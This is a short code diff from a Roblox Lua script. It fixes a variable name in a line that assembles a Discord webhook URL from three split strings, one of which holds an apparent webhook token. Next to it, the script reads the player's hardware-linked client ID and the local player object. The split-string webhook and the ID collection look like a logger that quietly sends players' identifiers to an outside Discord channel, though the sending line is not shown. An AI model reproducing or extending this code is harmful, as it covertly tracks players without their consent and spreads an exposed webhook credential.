@@ -4,7 +4,7 @@ local wb = "https://discord.com/api/webhooks/"
 local wb2 = "1332331284906774548/p-vfdkturXs0ppzmyDnZ7NOAQ4z5EM01hcO4a208_"
 local wb3 = "f35vk11d7BhA46zStwC_G3plTt0"
 
-local Webhook_ URL = wb..wb2..wb3
+local Webhook_URL = wb..wb2..wb3
 
 local S_hwid = game:GetService("RbxAnalyticsService"):GetClientId() or "Unknown"
 local plr = game.Players.LocalPlayer
